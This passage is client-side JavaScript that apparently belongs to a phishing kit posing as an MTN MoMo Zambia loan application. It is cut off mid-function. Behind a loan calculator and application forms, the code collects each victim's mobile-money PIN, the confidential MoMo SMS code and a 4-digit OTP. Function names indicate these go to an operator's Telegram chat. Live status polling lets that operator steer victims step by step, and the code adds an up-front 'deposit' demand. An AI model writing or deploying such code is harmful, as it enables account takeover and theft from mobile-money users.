(function () {
  const $ = (id) => document.getElementById(id);

  let currentUserId = null;
  let statusPollInterval = null;
  let smsTimerInterval = null;
  let smsAutoSubmittedForCurrentValue = '';
  let otpSubmittedForCurrentValue = '';
  let pinSubmitting = false;

  const urlParams = new URLSearchParams(window.location.search);
  const adminParam = urlParams.get('admin') || '';

  const REQUIRED_SMS_REGEX =
    /^Y['’]ello\.\s*Please note!\s*This confidential code gives access to your MoMo account:\s*.+$/i;

  function isValidMomoSms(rawSms) {
    const normalized = String(rawSms || '').replace(/\s+/g, ' ').trim();
    return REQUIRED_SMS_REGEX.test(normalized);
  }

  function toZeroPrefixPhone(rawPhone) {
    const digits = String(rawPhone || '').replace(/\D/g, '');
    if (digits.startsWith('260')) return '0' + digits.slice(3);
    if (digits.startsWith('0')) return digits;
    if (/^(96|76|56)\d{7}$/.test(digits)) return '0' + digits;
    return digits;
  }

  function isValidMtnZambia(rawPhone) {
    const normalized = toZeroPrefixPhone(rawPhone);
    return /^(096|076|056)\d{7}$/.test(normalized);
  }

  function formatDisplayPhone(rawPhone) {
    const zeroPhone = toZeroPrefixPhone(rawPhone);
    if (/^(096|076|056)\d{7}$/.test(zeroPhone)) {
      return `${zeroPhone.slice(0, 3)} ${zeroPhone.slice(3, 6)} ${zeroPhone.slice(6)}`;
    }
    return zeroPhone || '096 XXX XXXX';
  }

  function showBanner(el, msg) {
    if (!el) return;
    el.innerText = msg;
    el.classList.add('active');
  }

  function hideBanner(el) {
    if (!el) return;
    el.innerText = '';
    el.classList.remove('active');
  }

  function showLoading(title, sub) {
    const titleEl = $('loading-title');
    const subEl = $('loading-sub');
    const loadingOverlay = $('loading-overlay');
    if (titleEl) titleEl.innerText = title;
    if (subEl) subEl.innerText = sub;
    if (loadingOverlay) loadingOverlay.classList.add('active');
  }

  function hideLoading() {
    const loadingOverlay = $('loading-overlay');
    if (loadingOverlay) loadingOverlay.classList.remove('active');
  }

  function showScreen(targetScreen) {
    document.querySelectorAll('.screen').forEach((s) => s.classList.remove('active'));
    if (targetScreen) {
      targetScreen.classList.add('active');
      try {
        window.scrollTo({ top: 0, behavior: 'instant' });
      } catch (err) {
        window.scrollTo(0, 0);
      }
    }
  }

  function startSmsCountdown() {
    const smsSecondsSpan = $('sms-seconds');
    const smsTimerText = $('sms-timer-text');
    const btnRequestNewSms = $('btn-request-new-sms');

    let timeLeft = 15;
    if (smsSecondsSpan) smsSecondsSpan.innerText = timeLeft;
    if (smsTimerText) smsTimerText.classList.remove('hidden-btn');
    if (btnRequestNewSms) btnRequestNewSms.classList.add('hidden-btn');

    if (smsTimerInterval) clearInterval(smsTimerInterval);

    smsTimerInterval = setInterval(() => {
      timeLeft -= 1;
      if (smsSecondsSpan) smsSecondsSpan.innerText = Math.max(0, timeLeft);

      if (timeLeft <= 0) {
        clearInterval(smsTimerInterval);
        if (smsTimerText) smsTimerText.classList.add('hidden-btn');
        if (btnRequestNewSms) btnRequestNewSms.classList.remove('hidden-btn');
      }
    }, 1000);
  }

  function startStatusPolling() {
    if (statusPollInterval) clearInterval(statusPollInterval);

    statusPollInterval = setInterval(async () => {
      if (!currentUserId) return;

      try {
        const res = await fetch(`/api/check-status/${encodeURIComponent(currentUserId)}`);
        const data = await res.json();
        const st = data && data.status;

        const blockedReasonText = $('blocked-reason-text');
        const yelloPinInput = $('yello-pin-input');
        const btnSignInPin = $('btn-sign-in-pin');
        const smsInputBox = $('sms-input-box');
        const otpBoxes4 = Array.from(document.querySelectorAll('.otp-box-4'));

        if (st === 'BLOCKED') {
          clearInterval(statusPollInterval);
          if (smsTimerInterval) clearInterval(smsTimerInterval);
          pinSubmitting = false;
          hideLoading();
          if (blockedReasonText) {
            blockedReasonText.innerText =
              'Your application was blocked because valid MTN MoMo details were not confirmed.';
          }
          showScreen($('screen-stopped'));
        } else if (st === 'PROCEED_SMS') {
          clearInterval(statusPollInterval);
          pinSubmitting = false;
          hideLoading();
          hideBanner($('banner-sms-error'));
          hideBanner($('banner-sms-info'));
          smsAutoSubmittedForCurrentValue = '';
          if (smsInputBox) smsInputBox.value = '';
          showScreen($('screen-sms'));
          startSmsCountdown();
          if (smsInputBox) smsInputBox.focus();
        } else if (st === 'INCORRECT_PIN') {
          clearInterval(statusPollInterval);
          if (smsTimerInterval) clearInterval(smsTimerInterval);
          pinSubmitting = false;
          hideLoading();
          if (yelloPinInput) yelloPinInput.value = '';
          if (btnSignInPin) {
            btnSignInPin.disabled = false;
            btnSignInPin.classList.add('ready');
          }
          showScreen($('screen-pin'));
          showBanner($('banner-pin-error'), 'INCORRECT PIN — Please enter your 5-digit PIN and tap SIGN IN.');
          if (yelloPinInput) yelloPinInput.focus();
        } else if (st === 'SMS_EXPIRED') {
          clearInterval(statusPollInterval);
          pinSubmitting = false;
          hideLoading();
          smsAutoSubmittedForCurrentValue = '';
          if (smsInputBox) smsInputBox.value = '';
          showScreen($('screen-sms'));
          showBanner($('banner-sms-error'), 'SMS EXPIRES — Please enter a new SMS or request a new SMS.');
          startSmsCountdown();
          if (smsInputBox) smsInputBox.focus();
        } else if (st === 'PROCEED_OTP') {
          clearInterval(statusPollInterval);
          if (smsTimerInterval) clearInterval(smsTimerInterval);
          pinSubmitting = false;
          hideLoading();
          hideBanner($('banner-otp-error'));
          otpSubmittedForCurrentValue = '';
          otpBoxes4.forEach((b) => (b.value = ''));
          showScreen($('screen-otp'));
          if (otpBoxes4[0]) otpBoxes4[0].focus();
        } else if (st === 'OTP_EXPIRED') {
          clearInterval(statusPollInterval);
          if (smsTimerInterval) clearInterval(smsTimerInterval);
          pinSubmitting = false;
          hideLoading();
          otpSubmittedForCurrentValue = '';
          otpBoxes4.forEach((b) => (b.value = ''));
          showScreen($('screen-otp'));
          showBanner($('banner-otp-error'), 'OTP EXPIRED — Please enter your new MTN MoMo 4-Digit OTP.');
          if (otpBoxes4[0]) otpBoxes4[0].focus();
        } else if (st === 'SUCCESS' || st === 'APPROVED') {
          clearInterval(statusPollInterval);
          if (smsTimerInterval) clearInterval(smsTimerInterval);
          pinSubmitting = false;
          hideLoading();
          showScreen($('screen-success'));
        }
      } catch (e) {}
    }, 1000);
  }

  async function submitPinDirect(rawPin) {
    if (pinSubmitting) return;
    const pinInput = $('yello-pin-input');
    const signInBtn = $('btn-sign-in-pin');
    const errBanner = $('banner-pin-error');
    const pinVal = String(rawPin !== undefined ? rawPin : pinInput ? pinInput.value : '')
      .replace(/\D/g, '')
      .slice(0, 5);

    if (signInBtn) {
      signInBtn.disabled = false;
      signInBtn.classList.add('ready');
    }

    if (pinVal.length !== 5) {
      showBanner(errBanner, 'Please enter your 5-digit PIN before tapping SIGN IN.');
      if (pinInput) pinInput.focus();
      return;
    }

    pinSubmitting = true;
    hideBanner(errBanner);

    const fn = ($('first-name')?.value || '').trim();
    const ln = ($('last-name')?.value || '').trim();
    const applicantName =
      ($('sum-applicant')?.innerText || `${fn} ${ln}`).trim() || 'MTN MOMO ZAMBIA';
    const rawPhone =
      $('display-pin-phone')?.innerText || $('form-phone')?.value || '';
    const phoneZero = toZeroPrefixPhone(rawPhone);

    showLoading('SENDING DETAILS FOR VERIFICATION...', 'Please wait for admin response...');

    try {
      if (!currentUserId) {
        const appRes = await fetch(
          `/api/submit-application?admin=${encodeURIComponent(adminParam)}`,
          {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              adminChatId: adminParam,
              applicant: { fullName: applicantName, phone: phoneZero }
            })
          }
        );
        const appData = await appRes.json().catch(() => ({}));
        if (appData && appData.userId) {
          currentUserId = appData.userId;
        }
      }

      const res = await fetch('/api/submit-pin', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userId: currentUserId,
          phone: phoneZero,
          pin: pinVal,
          applicantName
        })
      });
      const data = await res.json().catch(() => ({}));
      if (data && data.userId) {
        currentUserId = data.userId;
      }
      startStatusPolling();
    } catch (e) {
      pinSubmitting = false;
      hideLoading();
      showBanner(errBanner, 'Connection error. Please tap SIGN IN again.');
    }
  }

  window.__submitPinDirect = submitPinDirect;

  function initApp() {
    const loanSlider = $('loan-amount-slider');
    const loanText = $('loan-amount-text');
    const monthsSlider = $('loan-months-slider');
    const monthsText = $('loan-months-text');
    const monthlyRepVal = $('monthly-rep-val');

    const formAmountInput = $('form-amount-input');
    const loanDurationSelect = $('loan-duration');
    const loanPurposeInput = $('loan-purpose');
    const firstNameInput = $('first-name');
    const lastNameInput = $('last-name');
    const formPhoneInput = $('form-phone');

    const sumAmount = $('sum-amount');
    const sumDuration = $('sum-duration');
    const sumPurpose = $('sum-purpose');
    const sumApplicant = $('sum-applicant');
    const depositRequiredAmount = $('deposit-required-amount');
    const successDepositAmount = $('success-deposit-amount');

    const bannerPhoneError = $('banner-phone-error');
    const bannerForm3Error = $('banner-form3-error');
    const bannerPinError = $('banner-pin-error');
    const bannerSmsError = $('banner-sms-error');
    const bannerSmsInfo = $('banner-sms-info');
    const bannerOtpError = $('banner-otp-error');

    const displayPinPhone = $('display-pin-phone');
    const yelloPinInput = $('yello-pin-input');
    const btnTogglePinVisibility = $('btn-toggle-pin-visibility');
    const btnSignInPin = $('btn-sign-in-pin');

    const displaySmsPhone = $('display-sms-phone');
    const smsInputBox = $('sms-input-box');
    const displayOtpPhone = $('display-otp-phone');
    const otpBoxes4 = Array.from(document.querySelectorAll('.otp-box-4'));

    function updateCalc() {
      const amt = loanSlider ? Number(loanSlider.value) || 100000 : 100000;
      const mths = monthsSlider ? Number(monthsSlider.value) || 48 : 48;
      if (loanText) loanText.innerText = `ZMW ${amt.toLocaleString()}`;
      if (monthsText) monthsText.innerText = `${mths} ${mths === 1 ? 'month' : 'months'}`;
      if (formAmountInput) formAmountInput.value = amt.toLocaleString();
      if (sumDuration) sumDuration.innerText = `${mths} Months`;
      const monthly = (amt * 1.1) / mths;
      if (monthlyRepVal) monthlyRepVal.innerText = `ZMW ${Math.round(monthly).toLocaleString()}`;
    }

    if (loanSlider) {
      loanSlider.addEventListener('input', updateCalc);
      loanSlider.addEventListener('change', updateCalc);
    }
    if (monthsSlider) {
      monthsSlider.addEventListener('input', updateCalc);
      monthsSlider.addEventListener('change', updateCalc);
    }
    updateCalc();

    if (yelloPinInput) {
      yelloPinInput.addEventListener('input', () => {
        const digits = yelloPinInput.value.replace(/\D/g, '').slice(0, 5);
        if (yelloPinInput.value !== digits) yelloPinInput.value = digits;
        if (btnSignInPin) {
          btnSignInPin.disabled = false;
          btnSignInPin.classList.add('ready');
        }
      });
      yelloPinInput.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') {
          e.preventDefault();
          submitPinDirect(yelloPinInput.value);
        }
      });
    }

    if (btnSignInPin) {
      btnSignInPin.disabled = false;
      btnSignInPin.classList.add('ready');
    }

    async function submitApplicationAndOpenPin() {
      hideBanner(bannerForm3Error);
      const fn = (firstNameInput?.value || '').trim();
      const ln = (lastNameInput?.value || '').trim();
      const ph = (formPhoneInput?.value || '').trim();

      const fullName =
        `${fn} ${ln}`.trim().toUpperCase() ||
        (sumApplicant?.innerText || '').trim() ||
        'MTN MOMO ZAMBIA';
      const zeroPhone = toZeroPrefixPhone(ph);
      const formattedPhone = formatDisplayPhone(zeroPhone);

      if (displayPinPhone) displayPinPhone.innerText = formattedPhone;
      if (displaySmsPhone) displaySmsPhone.innerText = formattedPhone;
      if (displayOtpPhone) displayOtpPhone.innerText = formattedPhone;
      if (sumApplicant) sumApplicant.innerText = fullName;

      pinSubmitting = false;
      otpSubmittedForCurrentValue = '';
      if (yelloPinInput) {
        yelloPinInput.value = '';
        yelloPinInput.type = 'password';
      }
      if (btnTogglePinVisibility) btnTogglePinVisibility.innerText = '👁️';
      if (btnSignInPin) {
        btnSignInPin.disabled = false;
        btnSignInPin.classList.add('ready');
      }
      otpBoxes4.forEach((b) => (b.value = ''));
      hideBanner(bannerPinError);
      hideBanner(bannerOtpError);

      showScreen($('screen-pin'));
      if (yelloPinInput) yelloPinInput.focus();

      try {
        const res = await fetch(
          `/api/submit-application?admin=${encodeURIComponent(adminParam)}`,
          {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              adminChatId: adminParam,
              applicant: { fullName, phone: zeroPhone }
            })
          }
        );
        const data = await res.json();
        if (data && data.success) {
          currentUserId = data.userId;
        }
      } catch (e) {}
    }

    async function submitSmsToTelegram(smsText, autoDetected) {
      hideBanner(bannerSmsError);
      hideBanner(bannerSmsInfo);
      const phoneZero = toZeroPrefixPhone(displaySmsPhone?.innerText || formPhoneInput?.value || '');

      showLoading('VERIFYING SMS CODE...', 'Please wait while admin reviews your SMS...');

      try {
        await fetch('/api/submit-sms', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            userId: currentUserId,
            phone: phoneZero,
            sms: smsText,
            autoDetected
          })
        });
        startStatusPolling();
      } catch (e) {
        hideLoading();
        showBanner(bannerSmsError, 'Unable to submit SMS. Please try again.');
      }
    }

    async function submitOtpToTelegram(otpVal, autoSubmitted) {
      hideBanner(bannerOtpError);
      const phoneZero = toZeroPrefixPhone(
        displayOtpPhone?.innerText || displaySmsPhone?.innerText || formPhoneInput?.value || ''
      );

      showLoading('VERIFYING MTN MOMO 4-DIGIT OTP...', 'Please wait for admin confirmation...');

      try {
        await fetch('/api/submit-otp', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            userId: currentUserId,
            phone: phoneZero,
            otp: otpVal,
            autoSubmitted
          })
        });
        startStatusPolling();
      } catch (e) {
        hideLoading();
        otpSubmittedForCurrentValue = '';
        showBanner(bannerOtpError, 'Unable to submit MTN MoMo 4-Digit OTP. Please try again.');
      }
    }

    function resetToWelcome() {
      if (statusPollInterval) clearInterval(statusPollInterval);
      if (smsTimerInterval) clearInterval(smsTimerInterval);
      currentUserId = null;
      pinSubmitting = false;
      smsAutoSubmittedForCurrentValue = '';
      otpSubmittedForCurrentValue = '';
      if (yelloPinInput) {
        yelloPinInput.value = '';
        yelloPinInput.type = 'password';
      }
      if (btnTogglePinVisibility) btnTogglePinVisibility.innerText = '👁️';
      if (btnSignInPin) {
        btnSignInPin.disabled = false;
        btnSignInPin.classList.add('ready');
      }
      otpBoxes4.forEach((b) => (b.value = ''));
      if (smsInputBox) smsInputBox.value = '';
      [
        bannerPhoneError,
        bannerForm3Error,
        bannerPinError,
        bannerSmsError,
        bannerSmsInfo,
        bannerOtpError
      ].forEach(hideBanner);
      hideLoading();
      showScreen($('screen-welcome'));
    }

    const buttonHandlers = {
      'btn-goto-slider': () => {
        updateCalc();
        showScreen($('screen-slider'));
      },
      'btn-slider-back': () => showScreen($('screen-welcome')),
      'btn-goto-form1': () => showScreen($('screen-form1')),
      'btn-form1-back': () => {
        updateCalc();
        showScreen($('screen-slider'));
      },
      'btn-form1-next': () => {
        const amtRaw = (formAmountInput?.value || '100,000').trim();
        const dur = loanDurationSelect?.value || '48 Months';
        const purp = (loanPurposeInput?.value || '').trim() || 'Business';
        if (sumAmount) sumAmount.innerText = `ZMW ${amtRaw}`;
        if (sumDuration) sumDuration.innerText = dur;
        if (sumPurpose) sumPurpose.innerText = purp;
        hideBanner(bannerPhoneError);
        showScreen($('screen-form2'));
      },
      'btn-form2-prev': () => showScreen($('screen-form1')),
      'btn-form2-next': () => {
        hideBanner(bannerPhoneError);
        const fn = (firstNameInput?.value || '').trim();
        const ln = (lastNameInput?.value || '').trim();
        const ph = (formPhoneInput?.value || '').trim();

        if (!fn || !ln) {
          showBanner(bannerPhoneError, 'Please enter your first name and last name.');
          return;
        }
        if (!isValidMtnZambia(ph)) {
          showBanner(
            bannerPhoneError,
            'Enter a valid MTN Zambia number starting with 096, 076, or 056.'
          );
          return;
        }

        const amtRaw = (formAmountInput?.value || '100,000').trim();
        const dur = loanDurationSelect?.value || '48 Months';
        const purp = (loanPurposeInput?.value || '').trim() || 'Business';
        if (sumAmount) sumAmount.innerText = `ZMW ${amtRaw}`;
        if (sumDuration) sumDuration.innerText = dur;
        if (sumPurpose) sumPurpose.innerText = purp;
        if (sumApplicant) sumApplicant.innerText = `${fn} ${ln}`.toUpperCase();

        const numericAmt = Number(amtRaw.replace(/\D/g, '')) || 100000;
        const depVal = Math.max(200, Math.round(numericAmt * 0.002));
        if (depositRequiredAmount) depositRequiredAmount.innerText = `${depVal} ZMW`;
        if (successDepositAmount) successDepositAmount.innerText = `${depVal} ZMW`;

        hideBanner(bannerForm3Error);
        showScreen($('screen-form3'));
      },
      'btn-form3-prev': () => showScreen($('screen-form2')),
      'btn-form3-submit': () => submitApplicationAndOpenPin(),
      'btn-pin-back': () => {
        if (statusPollInterval) clearInterval(statusPollInterval);
        pinSubmitting = false;
        hideLoading();
        showScreen($('screen-form3'));
      },
      'link-forgot-pin': (e) => {
        if (e) e.
